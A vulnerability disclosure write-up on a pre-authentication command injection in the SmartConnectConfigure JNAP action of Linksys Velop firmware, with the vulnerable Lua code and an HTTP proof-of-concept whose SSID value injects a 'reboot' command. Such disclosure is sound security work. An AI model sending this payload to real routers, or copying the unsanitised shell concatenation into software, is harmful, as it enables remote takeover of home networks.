---
published: true
categories: [vulnerability,Linksys]
tags: [Linksys Velop Command Injection]
---

### Affected Software
The firmware version which I test is 1.1.2.185309
### Product Background
Velop is WHOLE HOMEMESH Wi-Fi system from LINKSYS. It allows users enjoy fast, nonstop Wi-Fi everywhere with Velop’s modular easy-to-use Wi-Fi Mesh system.
There are three categories from their official site :WHW0303,WHW0302,WHW0301. The differences between these three is the pack count: 1, 2 or 3. The system are the same.
### Vulnerability Details
No CVE at the moment
There is a command injection vulnerability through JNAP action of http://linksys.com/jnap/nodes/smartconnect/SmartConnectConfigure , the vulneraibility may lead to RCE without authentication
JNAP is a web services protocol for Cisco, similar as HNAP. 

There are many X-JNAP-Actions can be made through HTTP request. One of the action is http://linksys.com/jnap/nodes/smartconnect/SmartConnectConfigure , for example, the http server can handle the following request without any authentication.
~~~http
POST /JNAP/ HTTP/1.1
    Host: 10.158.1.1
    Accept: application/json; charset=UTF-8
    Expires: Fri, 10 Oct 2015 14:19:41 GMT
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-Hans-CN;q=1, en-CN;q=0.9
    Cache-Control: no-cache
    Content-Type: application/json; charset=UTF-8
    Content-Length: 135
    User-Agent: Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00)
    Connection: close
    X-JNAP-Action: http://linksys.com/jnap/nodes/smartconnect/SmartConnectConfigure
    
    {"configApSsid":"ssid","configApPassphrase":"wifipass","srpLogin":"user","srpPassword":"password"}
~~~

Through the action name, this request seems to be used to configure the smart wifi so it needn't any authentication.The first .lua file which processes this request is smartconnect_server.lua in /JNAP/modules/:
~~~lua
local function SmartConnectConfigure(ctx, input)
        local smc = require('smartconnect')
        local sc = ctx:sysctx()
        local error, output = smc.smartConnectConfigure(sc, input)
        return error or 'OK'
    end
~~~

Input parameters will be passed to smartConnectConfigure function in smartconnect.lua in /usr/local/lib/lua/5.1/, when we looked into this function and found there is no check of the input parameters:

~~~lua
function _M.smartConnectConfigure(sc, input)
        sc:writelock()
        local hdk = require('libhdklua')
        local smart_mode = sc:get_smartmode()
        if smart_mode == 2 then
            -- If a device is Master node.
            local error, output = bluetooth.btSmartConnectConfigure(input.configApSsid, input.configApPassphrase, input.srpLogin, input.srpPassword)
            if not error then
                return nil
            else
                return error
            end
        elseif smart_mode == 0 then
            -- If a device is Unconfigured.
            sc:set_smartconnect_configured_ssid(input.configApSsid);
            sc:set_smartconnect_configured_passphrase(input.configApPassphrase);
            sc:set_smartconnect_auth_login(input.srpLogin);
            sc:set_smartconnect_auth_pass(input.srpPassword);
            sc:set_smartmode(1)
            sc:set_bridge_mode_wo_reboot(1)
            sc:set_wifibridge_mode_wo_event(2)
            -- sc:setevent(_M.SMART_CONNECT_SETUP_STATUS, 'DONE')
            -- sc:setevent(_M.FORWARDING_RESTART, '')
            os.execute('smcdb_cli create')
            os.execute('smcdb_cli update -s '..input.configApSsid..' -p '..input.configApPassphrase..' -l '..input.srpLogin..' -a '..input.srpPassword)
            os.execute('sysevent set smart_connect::setup_status AUTH')
            os.execute('sysevent set forwarding-restart')
            return nil
        else
            return 'ErrorBTUnsupportedMode'
        end
    end
~~~

Then btSmartConnectConfigure will be called:

~~~lua
function _M.btSmartConnectConfigure(configap, configpass, srplogin, srppass)
        local opt = '-f '..'-A '..configap..'-P '..configpass..'-L '..srplogin..'-R '..srppass
        local error, output = _M.btRunCentralCommandSync(opt)
        if error then
            return '_ErrorUnexpected'
        end
        return nil, output
    end

    function _M.btRunCentralCommandSync(option)
        assert(option)
        local output = {}
        local table
        local jsonData
        local json = require('libhdkjsonlua')
        local file = io.(_M.RUN_CENTRAL_CMD_SYNC:format(option))
        if file then
            jsonData = file:read('*a')
            file:close()
            -- Parsing result
            table = json.parse(jsonData)
            if not table then
                platform.logMessage(platform.LOG_ERROR, ('Failed parsing JSON data\n'))
                return 'error_get_result_fail'
            end
            if table.result == 'error_bt' then
                platform.logMessage(platform.LOG_ERROR, ('JNAP error(%s) occurred\n'):format(table.result))
                return 'error_get_result_fail'
            end
            if table.result == 'error_jnap_req_fail' then
                platform.logMessage(platform.LOG_ERROR, ('JNAP error(%s) occurred\n'):format(table.result))
                return 'error_get_result_fail'
            end
            if table.result == 'error_not_connected' then
                platform.logMessage(platform.LOG_ERROR, ('JNAP error(%s) occurred\n'):format(table.result))
                return 'ErrorBTNotConnected'
            end
            if table.result == 'error_conn_lost' then
                platform.logMessage(platform.LOG_ERROR, ('JNAP error(%s) occurred\n'):format(table.result))
                return 'ErrorBTConnectionLost'
            end
            if table.result == 'error_notify_timeout' then
                platform.logMessage(platform.LOG_ERROR, ('JNAP error(%s) occurred\n'):format(table.result))
                return 'ErrorBTPeripheralNotRespond'
            end
            if table.result == 'error_command_fail' then
                platform.logMessage(platform.LOG_ERROR, ('JNAP error(%s) occurred\n'):format(table.result))
                return 'ErrorBTCommandFailed'
            end
            if table.result == 'error_notify_enable_fail'
                or table.result == 'error_gatt_read_fail'
                or table.result == 'error_gatt_write_fail' then
                platform.logMessage(platform.LOG_ERROR, ('JNAP error(%s) occurred\n'):format(table.result))
                return 'ErrorBTCommunicationFailed'
            end
           output = table
        end
        return nil, output
    end
~~~

RUN_CENTRAL_CMD_SYNC is defined at the top of bluetooth.lua

    _M.RUN_CENTRAL_CMD_SYNC = '/usr/bin/btsetup_central %s'

So, there are four parameters passed to the function btSmartConnectConfigure: configApSsid,configApPassphrase,srpLogin and srpPassword. In the btRunCentralCommandSync function,  there is a call to /usr/bin/btsetup_central with the four parameters given. There is not any check of the four parameters and cause a command injection problem. Since this request will be processed without authentication, an attacker can get RCE with preauth.

#### PoC
The following PoC will cause a reboot of the node.
~~~http
    POST /JNAP/ HTTP/1.1
    Host: 10.158.1.1
    Accept: application/json; charset=UTF-8
    Expires: Fri, 10 Oct 2015 14:19:41 GMT
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-Hans-CN;q=1, en-CN;q=0.9
    Cache-Control: no-cache
    Content-Type: application/json; charset=UTF-8
    Content-Length: 135
    User-Agent: Linksys/2.5.2 (iPhone; iOS 11.2.6; Scale/3.00)
    Connection: close
    X-JNAP-Action: http://linksys.com/jnap/nodes/smartconnect/SmartConnectConfigure
    
    {"configApSsid":"testssid;reboot;","configApPassphrase":"testwifipass","srpLogin":"testlogin","srpPassword":"testpass"}
~~~

### Timeline

2018-03-04: Discovered

2019-02-05: Reported, but the vendor has fixed
